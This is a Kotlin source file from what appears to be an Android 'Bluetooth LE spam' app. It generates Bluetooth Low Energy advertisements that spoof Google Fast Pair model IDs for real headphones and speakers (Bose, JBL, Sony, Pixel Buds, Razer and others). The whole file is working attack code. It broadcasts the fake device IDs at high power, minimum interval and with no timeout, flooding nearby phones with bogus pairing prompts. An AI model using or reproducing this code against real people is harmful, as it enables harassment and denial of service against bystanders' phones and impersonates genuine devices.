package de.simon.dankelmann.bluetoothlespam.AdvertisementSetGenerators

import android.bluetooth.BluetoothDevice
import android.bluetooth.le.AdvertiseData
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.AdvertisingSetParameters
import android.os.ParcelUuid
import de.simon.dankelmann.bluetoothlespam.Callbacks.GoogleFastPairAdvertisingCallback
import de.simon.dankelmann.bluetoothlespam.Callbacks.GoogleFastPairAdvertisingSetCallback
import de.simon.dankelmann.bluetoothlespam.Constants.Constants
import de.simon.dankelmann.bluetoothlespam.Helpers.StringHelpers
import de.simon.dankelmann.bluetoothlespam.Models.AdvertisementSet
import java.util.UUID

class GoogleFastPairAdvertisementSetGenerator:IAdvertisementSetGenerator{

    val _genuineDeviceIds = mapOf(
        "CD8256" to "Bose NC 700",
        "F52494" to "JBL Buds Pro",
        "718FA4" to "JBL Live 300TWS",
        "821F66" to "JBL Flip 6",
        "92BBBD" to "Pixel Buds",
        "D446A7" to "Sony XM5",
        "2D7A23" to "Sony WF-1000XM4",
        "0E30C3" to "Razer Hammerhead TWS",
        "72EF8D" to "Razer Hammerhead TWS X",
        "72FB00" to "Soundcore Spirit Pro GVA"
    )

    val serviceUuid = ParcelUuid(UUID.fromString("0000fe2c-0000-1000-8000-00805f9b34fb"))

    override fun getAdvertisementSets():List<AdvertisementSet> {
        var advertisementSets:MutableList<AdvertisementSet> = mutableListOf()

        _genuineDeviceIds.map {

            val settings = AdvertiseSettings.Builder()
                .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
                .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
                .setConnectable(true)
                .setTimeout(0)
                .build()

            val advertisingSetParameters = AdvertisingSetParameters.Builder()
                .setLegacyMode(true)
                .setInterval(AdvertisingSetParameters.INTERVAL_MIN)
                .setTxPowerLevel(AdvertisingSetParameters.TX_POWER_MEDIUM)
                //.setIncludeTxPower(true)
                .setPrimaryPhy(BluetoothDevice.PHY_LE_CODED)
                .setSecondaryPhy(BluetoothDevice.PHY_LE_2M)
                .build()

            val advertiseData: AdvertiseData = AdvertiseData.Builder()
                .setIncludeDeviceName(false)
                .addServiceUuid(serviceUuid)
                .addServiceData(serviceUuid, StringHelpers.decodeHex(it.key))
                //.addManufacturerData(manufacturerId, serviceData)
                //.addManufacturerData(manufacturerId, manufacturerSpecificData)
                .setIncludeTxPowerLevel(true)
                .build()

            val scanResponse: AdvertiseData = AdvertiseData.Builder()
                .setIncludeTxPowerLevel(true)
                .build()

            var advertisementSet:AdvertisementSet = AdvertisementSet()
            advertisementSet.deviceName = it.value
            advertisementSet.advertiseData = advertiseData
            advertisementSet.advertisingSetParameters = advertisingSetParameters
            advertisementSet.advertisingSetCallback = GoogleFastPairAdvertisingSetCallback()
            advertisementSet.advertisingCallback = GoogleFastPairAdvertisingCallback()
            advertisementSet.advertiseSettings = settings
            advertisementSet.scanResponse = scanResponse

            advertisementSets.add(advertisementSet)
        }

        return advertisementSets.toList()
    }


}